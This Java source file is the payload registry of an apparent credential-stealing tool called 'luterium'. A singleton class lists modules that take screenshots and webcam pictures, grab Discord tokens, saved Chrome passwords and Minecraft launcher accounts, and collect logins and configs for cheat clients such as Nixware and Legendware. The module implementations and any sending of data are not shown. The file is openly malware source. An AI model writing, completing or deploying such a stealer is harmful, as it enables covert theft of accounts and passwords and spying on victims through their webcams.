package dev.peter.luterium.payload;

import dev.peter.luterium.features.*;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.Optional;

/**
 @author Peter
 @since 08/14/2022
 **/

public final class Payload {
    private static final Payload INSTANCE = new Payload();
    private final List<PayloadExecutor> payloads = new ArrayList<>(); //Payload list.

    private Payload() {
        payloads.addAll(Arrays.asList(
                new Info(),
                new ScreenShot(),
                new ModsFolder(),
                new UsefulFiles(),
                new NixwareLogin(),
                new WebcamPicture(),
                new DiscordTokens(),
                new ChromePassword(),
                new NixwareConfigs(),
                new JarsFromDesktop(),
                new LegendwareScripts(),
                new MCLauncherAccounts()
        ));
    }

    public static Optional<PayloadExecutor> getPayload(Class<? extends PayloadExecutor> klazz)
    {
        return getPayloads().stream().filter(p -> p.getClass().equals(klazz)).findAny();
    }
    public static List<PayloadExecutor> getPayloads()
    {
        return INSTANCE.payloads;
    }
}
